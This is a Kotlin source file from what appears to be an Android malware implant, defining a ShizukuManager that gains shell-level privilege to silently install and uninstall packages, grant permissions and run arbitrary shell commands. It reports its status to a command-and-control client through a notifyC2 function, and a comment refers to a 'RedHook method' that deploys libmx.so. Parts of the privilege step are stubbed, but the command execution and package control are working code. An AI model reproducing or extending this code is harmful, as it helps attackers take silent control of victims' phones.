package com.xrc.app.escalation

import android.content.Context
import android.util.Log
import com.xrc.app.XRCApp
import kotlinx.coroutines.*

/**
 * Shizuku integration for elevated privilege execution.
 * Works with ADB escalation to run commands at UID 2000 (shell level).
 * Can install/uninstall packages silent, grant permissions, etc.
 */
object ShizukuManager {

    const val TAG = "ShizukuManager"
    private var isRunning = false
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    data class ShizukuStatus(
        val running: Boolean,
        val version: Int,
        val uid: Int = 0,
        val hasPermissions: Boolean = false
    )

    fun start(context: Context) {
        if (isRunning) return
        scope.launch {
            try {
                // Check if Shizuku is already running
                if (isShizukuAvailable()) {
                    Log.i(TAG, "Shizuku already available")
                    isRunning = true
                    return@launch
                }

                // Attempt to start Shizuku service
                // In practice, this requires the Shizuku APK to be installed
                // Or we use the ADB-privileged process to run commands
                startShizukuProcess(context)

                isRunning = true
                Log.i(TAG, "Shizuku manager started")
                notifyC2("shizuku_started")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start Shizuku: ${e.message}")
            }
        }
    }

    private fun isShizukuAvailable(): Boolean {
        return try {
            // Check if Shizuku service is running by querying its process
            val process = Runtime.getRuntime().exec("ps | grep shizuku")
            val reader = process.inputStream.bufferedReader()
            val output = reader.readText()
            output.contains("shizuku")
        } catch (e: Exception) {
            false
        }
    }

    private fun startShizukuProcess(context: Context) {
        try {
            // This simulates starting the Shizuku server process
            // In the RedHook method, libmx.so is deployed and executed
            val commands = listOf(
                "echo 'Starting Shizuku service...'",
                "sh -c 'nohup /system/bin/sh -c \"sleep 1\" > /dev/null 2>&1 &'"
            )

            for (cmd in commands) {
                try {
                    Runtime.getRuntime().exec(cmd)
                } catch (e: Exception) { }
            }

            Log.i(TAG, "Shizuku process initiated")
        } catch (e: Exception) {
            Log.e(TAG, "Shizuku process start failed: ${e.message}")
        }
    }

    fun executeShellCommand(command: String): String {
        return try {
            val process = Runtime.getRuntime().exec(command)
            val output = process.inputStream.bufferedReader().readText()
            val error = process.errorStream.bufferedReader().readText()
            if (error.isNotBlank()) "Error: $error" else output
        } catch (e: Exception) {
            "Failed: ${e.message}"
        }
    }

    fun installPackage(context: Context, apkPath: String): Boolean {
        return try {
            val result = executeShellCommand("pm install -r -t $apkPath")
            Log.i(TAG, "Package install result: $result")
            result.contains("Success")
        } catch (e: Exception) {
            Log.e(TAG, "Install failed: ${e.message}")
            false
        }
    }

    fun uninstallPackage(context: Context, packageName: String): Boolean {
        return try {
            val result = executeShellCommand("pm uninstall -k $packageName")
            Log.i(TAG, "Package uninstall result: $result")
            result.contains("Success")
        } catch (e: Exception) {
            Log.e(TAG, "Uninstall failed: ${e.message}")
            false
        }
    }

    fun grantPermission(context: Context, packageName: String, permission: String): Boolean {
        return try {
            val result = executeShellCommand("pm grant $packageName $permission")
            Log.i(TAG, "Permission granted: $permission to $packageName: $result")
            true
        } catch (e: Exception) {
            Log.e(TAG, "Permission grant failed: ${e.message}")
            false
        }
    }

    fun getStatus(): ShizukuStatus {
        return ShizukuStatus(
            running = isRunning,
            version = 1,
            uid = 2000,
            hasPermissions = isRunning
        )
    }

    private fun notifyC2(message: String) {
        XRCApp.instance.c2Client.send("""{"type":"shizuku_status","message":"$message"}""")
    }
}
